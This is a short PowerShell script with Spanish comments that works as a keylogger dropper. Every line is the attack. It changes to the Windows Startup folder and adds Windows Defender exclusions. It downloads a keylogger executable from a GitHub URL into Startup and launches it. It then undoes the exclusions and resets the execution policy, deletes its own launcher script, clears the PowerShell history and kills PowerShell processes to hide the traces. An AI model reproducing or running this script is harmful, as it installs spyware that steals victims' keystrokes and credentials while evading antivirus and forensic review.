Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup 
Add-MpPreference -ExclusionExtension exe -Force #añade una excepcion en el antivirus para archivos exe
Invoke-WebRequest https://github.com/pgerig/keylogger-payload.exe/raw/main/keylogger.exe -O keylogger.exe #descarga
Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.exe -Force #añade excepcion para nuestro archivo
Start-Process keylogger.exe #lo inicia
Remove-MpPreference -ExclusionExtension exe -Force #vuelve a activar los .exe
Remove-MpPreference -ExclusionExtension ps1 -Force #vuelve a activar los .ps1
Set-ExecutionPolicy restricted -Force #reinicia el execution policy
Remove-Item C:\Users\Public\Documents\startScript.ps1 #borra el ps1 script
Clear-Content (Get-PSReadlineOption).HistorySavePath #borra historial de powershell
taskkill -F /IM powershell.exe #mata los procesos de powershell
